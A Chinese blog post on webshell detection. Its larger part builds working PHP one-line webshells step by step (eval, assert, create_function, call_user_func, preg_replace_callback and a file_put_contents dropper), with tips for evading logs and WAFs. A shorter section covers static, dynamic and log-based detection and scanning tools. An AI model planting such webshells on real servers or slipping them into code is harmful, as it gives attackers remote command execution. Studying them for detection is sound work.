---
title: Webshell检测
date: 2020-9-11 16:57:27
tags:
 - Webshell
---
#### 概述

Web：指的是在Web服务器，而shell是用脚本语言编写的脚本程序，Webshell就是就是Web的一个管理工具，可以对Web服务器进行操作的权限，也叫webadmin。

Webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到Web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。

#### 分类

##### 编程语言

Webshell根据编程语言可以分为：

```
PHP木马
ASP木马
.NET木马
JSP木马
python动态网页
```

##### 功能

根据功能分为`大马`、`小马`、`打包马`、`脱裤马`；

小马通常指的一句话木马，体积较小，例如：`<%eval request(“pass”)%>`通常把这句话写入一个文档里面，然后修改xx.asp或php后缀。然后上传至服务器上。eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。

大马通常体积比较大 一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序。

#### 常用函数

由以上Webshell功能介绍了解到，它们使用各编程语编写并上传到目标服务器上执行；尝试获取系统命令、及网站web权限。因此需要使用对应编程语言内系统函数。

（PHP语言示例）

##### system

函数将命令作为参数，并输出结果。

```php+HTML
<?php
eval(system('date'));
?>
```

![image-20200910191501727](/images/webshell/image-20200910191501727.png)

 PHP 中的`超全局变量`(如`$_GET`、`$_POST`、`$_REQUEST`、`$_COOKIE`）获取攻击者的指令输入。

```php+HTML
<?php
//eval(system('date'));
$tmp='system("'.$_GET[cmd].'");';
eval($tmp);

?>
```

![image-20200910192925561](/images/webshell/image-20200910192925561.png)

这里还有点问题：

1. 使用了超全局变量 `$_GET` 来通过 get 方法获取用户的输入命令。但是 GET 方法有一些限制，第一是存在长度限制：特定的浏览器及服务器会对通过 get 方法提交的字符串有一定的限制。第二是当网站管理员查 log 的时候，会看到明文的 get 请求参数，容易被发现，相比之下， post 请求敏感内容不容易被发现。所以最好把 get 方法换成 post 方法。
2. system 函数不应该被写进去。一方面是因为因为有时候 php 中的一些危险函数会被开发者或者网站管理人员禁用，我们可以先不写命令执行函数，攻击的时候可以自行选择更厉害的方法进行绕过。另一方面是写入了 system 这个一句话木马就只能执行命令了，但是不写的话通过使用不同的 payload 一个一句话木马其实啥都能做（就像一句话木马连上菜刀之后的功能），基本跟大马一样。
3. 在 eval 前面可以加一个 `@`，@是忽略可能出现的错误。

因此最后形成的一句话木马：

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
@eval($_POST[cmd]);
?>
```

![image-20200910201443491](/images/webshell/image-20200910201443491.png)

##### assert

assert 这个函数在 php 语言中是用来判断一个表达式是否成立。返回 true or false；assert 函数的参数会被执行，这跟 eval() 类似。

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
assert(system("date"));
?>
```

![image-20200910202300583](/images/webshell/image-20200910202300583.png)

```php+HTML
//post型
<?php
@assert($_POST['c']);
?>
```

```
给 assert() 函数传入字符串参数，这个特性在 7.2 禁用，在 8.0 版本时会被彻底删除。
```

注意：我们对一句话木马使用的一些 payload，比如 phpinfo() 或者 system(‘command’)，因为不是字符串，所以也就不受版本限制。

如下所示：

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
assert($_GET['cmd']);
?>
```

![image-20200910202837253](/images/webshell/image-20200910202837253.png)

##### create_function

在php中，函数`create_function`主要用来创建匿名函数。

```php+HTML
string create_function(string $args, string $code)
string $args 变量部分
string $code 方法代码部分
```

注意当我们使用此匿名函数的时候，方法代码部分会被执行。

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
//assert($_GET['cmd']);
$tmp = create_function('',system('date'));
$tmp();
?>
```

![image-20200910203507277](/images/webshell/image-20200910203507277.png)



构造一句话木马

```php+HTML
<?php
$tmp = create_function('',$_POST['cmd']);
$tmp();
?>
```

把用户传递的数据生成一个函数 tmp()，然后再执行 tmp()：

![image-20200910203732113](/images/webshell/image-20200910203732113.png)

##### call_user_func

`call_user_func` 这个函数可以调用其它函数，被调用的函数是 `call_user_func` 的第一个函数，被调用的函数的参数是 `call_user_func` 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
//assert($_GET['cmd']);
//$tmp = create_function('',system('date'));
//$tmp();

//$tmp = create_function('',$_POST['cmd']);
//$tmp();

call_user_func(system("date"));

?>
```

![image-20200910205446756](/images/webshell/image-20200910205446756.png)

其实所有的一句话木马都由两部分组成：

1. 接收攻击者输入
2. 命令执行函数

在`PHP Version 7.3.4`，webshell 是无法回显的.

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
//assert($_GET['cmd']);
//$tmp = create_function('',system('date'));
//$tmp();

//$tmp = create_function('',$_POST['cmd']);
//$tmp();

//call_user_func(system("date"));
call_user_func(assert,$_POST['cmd']);
//@call_user_func(assert,phpinfo());

?>
```

如下图所示显示为空

![image-20200910210011420](/images/webshell/image-20200910210011420.png)

绕过

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
//assert($_GET['cmd']);
//$tmp = create_function('',system('date'));
//$tmp();

//$tmp = create_function('',$_POST['cmd']);
//$tmp();

//call_user_func(system("date"));
//call_user_func(assert,$_POST['cmd']);
@call_user_func(assert,phpinfo());

?>
```

![image-20200910210301627](/images/webshell/image-20200910210301627.png)



由以上`assert()`函数介绍，给 assert() 函数传入字符串参数，这个特性在 7.2 禁用。

因为通过超全局常量 `$_GET['']`获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。

但是直接`assert(phpinfo())`传入的参数是函数，所以就不会触发函数禁用，可以正常回显。

此时更换PHP版本为`7.0.33`如下图所示可以显示。

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
//assert($_GET['cmd']);
//$tmp = create_function('',system('date'));
//$tmp();

//$tmp = create_function('',$_POST['cmd']);
//$tmp();

//call_user_func(system("date"));
//call_user_func(assert,$_POST['cmd']);
//@call_user_func(assert,phpinfo());

@call_user_func(assert,$_GET['cmd']);
?>
```

![image-20200911104416978](/images/webshell/image-20200911104416978.png)

更换7.1.20尝试，无法显示phpinfo信息

![image-20200911104522817](/images/webshell/image-20200911104522817.png)

这个禁用特性其实是从 php 7.1 版本开始，所以 `call_user_func + assert` 构造的一句话木马在 php 7.0 版本及以下可以使用。

##### preg_replace_callback

 `preg_replace /e` 函数写 webshell，因为此函数5.5.0及以上版本已经被弃用了。使用 preg_replace_callback() 代替。

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
//assert($_GET['cmd']);
//$tmp = create_function('',system('date'));
//$tmp();

//$tmp = create_function('',$_POST['cmd']);
//$tmp();

//call_user_func(system("date"));
//call_user_func(assert,$_POST['cmd']);
//@call_user_func(assert,phpinfo());

//@call_user_func(assert,$_GET['cmd']);

preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['cmd']);

?>
```

此 webshell 的原理为：通过 `create_function` “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。

![image-20200911105751006](/images/webshell/image-20200911105751006.png)

##### file_put_contents

webshell 调试三部曲：

1. 把函数写在 php 文件中，看能否执行
2. 写成 `$_GET['']` 方式传入命令，看能否执行
3. 写成 `$_POST['']`方式传入命令，能能否执行命令
   `注：`2、3步可以合成通过`$_REQUEST['']`方法传入命令。

```php+HTML
<?php
//eval(system('date'));
//$tmp='system("'.$_GET[cmd].'");';
//eval($tmp);
//@eval($_POST[cmd]);
//assert(system("date"));
//assert($_GET['cmd']);
//$tmp = create_function('',system('date'));
//$tmp();

//$tmp = create_function('',$_POST['cmd']);
//$tmp();

//call_user_func(system("date"));
//call_user_func(assert,$_POST['cmd']);
//@call_user_func(assert,phpinfo());

//@call_user_func(assert,$_GET['cmd']);

//preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['cmd']);

$test='<?php $a=$_POST["cmd"];assert($a); ?>';
file_put_contents("Trojan.php", $test);
?>
```

上面这个 webshell 利用函数生成 `Trojan.php` 木马文件。
`file_put_contents` 函数：生成一个文件。第一个参数是文件名，第二个参数是文件的内容。

![image-20200911110201716](/images/webshell/image-20200911110201716.png)

![image-20200911110325971](/images/webshell/image-20200911110325971.png)

如上图所示：命令成功执行

##### exec

exec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。

```php+HTML
<?php
exec("ls")
//echo exec("ls");
?>
```

无法回显，使用`exec()`函数执行echo命令，只会输出最后一行命令结果。

```php+HTML
<?php
//exec("ls")
echo exec("ls");
?>
```

![image-20200911111810853](/images/webshell/image-20200911111810853.png)

如果指定了第二个参数，则返回结果为数组。

```php+HTML
<?php
//exec("ls")
exec("ls",$array);
print_r($array);
?>
```



![image-20200911111954897](/images/webshell/image-20200911111954897.png)

##### shell_exec

shell_exec()函数类似于exec()，但是，其整个输出结果为字符串。

```php+HTML
<?php
echo shell_exec("ls -al");
?>
```

![image-20200911112228548](/images/webshell/image-20200911112228548.png)

##### passthru

passthru()执行一个命令并返回原始格式的输出.

```php+HTML
<?php
passthru("ls -l");
?>
```

![image-20200911112637207](/images/webshell/image-20200911112637207.png)

#### 检测手段

##### 静态检测

攻击者入侵服务器，使用Webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测。

静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，且误报、漏报率会比较高，但如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。

缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。对于单站点的网站，用静态检测还是有很大好处，配合人工，能快速定位webshell，但是如果是一个成千上万站点的大型企业呢，这个时候再人肉那工作量可就大了。

因此用这样一种思路：强弱特征。即把特征码分为强弱两种特征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。要解决误报和漏报，就不能拘泥于代码级别了。

同时结合文件系统。结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，如果我的Web目录无缘无故多了个nobody属主的文件，这里就有问题了。最理想的办法是需要制度和流程来建设一个web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发现。

##### 动态检测

Webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。

Webshell传到服务器了，总要去执行它，Webshell执行时刻表现出来的特征，我们称为动态特征。Webshell通信是HTTP协议。只要我们把Webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。

webshell起来如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。

##### 日志检测

访问Webshell一般不会在系统日志中留下记录，但是会在网站的`web日志`中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。

例如：一个平时是GET的请求改用POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。

#### Tools

以上介绍了部分检测手段，当然也少不了一些自动化工具(如下)，但是还需人工协助实现对Webshell检测的误报率。

[findWebshell](https://github.com/he1m4n6a/findWebshell)

一款本地检测Webshell工具，基本Webshell均可检测。可down到本地测试。检测脚本使用python编写。

[D盾](http://www.d99net.net/News.asp?id=47)

一款Windows客户端检测Webshell检测工具。较多人使用，具体使用下载本地测试即可。

[河马](https://www.shellpub.com/)

官网介绍：专注webshell查杀研究。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。

[安全狗](http://www.safedog.cn/)

网站、服务器的检测，同时可以支持安全攻击防御，webshell检测等功能。

#### Referer

```
https://www.jianshu.com/p/02aac12e459f
http://blog.leanote.com/post/snowming/2e1ab18dfa80
https://www.cnblogs.com/he1m4n6a/p/9245155.html
```

